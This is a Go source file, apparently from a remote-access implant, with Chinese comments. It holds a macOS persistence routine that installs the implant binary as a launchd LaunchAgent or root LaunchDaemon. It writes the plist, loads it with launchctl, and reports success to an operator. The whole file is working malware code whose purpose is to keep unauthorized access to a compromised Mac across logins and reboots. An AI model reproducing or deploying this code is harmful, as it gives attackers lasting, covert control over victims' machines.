//go:build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Persist 在 macOS 上通过 launchd 植入持久化。technique 格式: "方法 [label]"。
//
//	launchagent  ~/Library/LaunchAgents/<label>.plist —— 登录用户身份，登录时启动
//	launchdaemon /Library/LaunchDaemons/<label>.plist —— root 身份，开机时启动（需要 root）
//
// 参数取当前进程的 os.Args[1:]：生成时设了执行口令的植入体必须带口令启动，
// 否则持久化后会在口令校验处直接退出（表现为"持久化成功但重启不上线"）。
func Persist(technique string) ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	// 解析符号链接：launchd 记录的是真实路径，指向临时目录的路径在重启后可能已失效
	if resolved, err := filepath.EvalSymlinks(exe); err == nil {
		exe = resolved
	}

	fields := strings.Fields(technique)
	method := ""
	if len(fields) > 0 {
		method = fields[0]
	}
	label := ""
	if len(fields) > 1 {
		label = sanitizeLabelPart(fields[1])
	}
	if label == "" {
		label = launchdPlistLabel(filepath.Base(exe))
	}

	var dir string
	switch method {
	case "launchagent", "agent":
		home, err := os.UserHomeDir()
		if err != nil {
			return nil, err
		}
		dir = filepath.Join(home, "Library", "LaunchAgents")
	case "launchdaemon", "daemon":
		if os.Geteuid() != 0 {
			return nil, fmt.Errorf("launchdaemon 需要 root 权限（当前 uid=%d）", os.Geteuid())
		}
		dir = "/Library/LaunchDaemons"
	default:
		return nil, fmt.Errorf("不支持的 macOS 持久化方法: %s（可用 launchagent|launchdaemon）", method)
	}

	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, fmt.Errorf("创建 %s 失败: %v", dir, err)
	}
	plistPath := filepath.Join(dir, label+".plist")
	content := buildLaunchdPlist(label, exe, os.Args[1:])
	if err := os.WriteFile(plistPath, []byte(content), 0o644); err != nil {
		return nil, fmt.Errorf("写入 plist 失败: %v", err)
	}

	// 载入 launchd：按候选顺序尝试，任一成功即返回
	uid := fmt.Sprintf("%d", os.Getuid())
	var lastErr error
	for _, args := range launchdLaunchArgs(plistPath, uid) {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err == nil {
			return []byte(fmt.Sprintf("✅ %s 持久化成功: %s\n   已载入 launchd（%s）", method, plistPath, strings.Join(args, " "))), nil
		}
		lastErr = fmt.Errorf("%s: %v: %s", strings.Join(args, " "), err, strings.TrimSpace(string(out)))
	}
	// plist 已落盘但未能载入：如实报错（重启后仍会生效，但要告诉操作员当前未激活）
	return []byte(fmt.Sprintf("⚠️ plist 已写入 %s，但载入 launchd 失败（重启后仍会生效）: %v", plistPath, lastErr)), nil
}
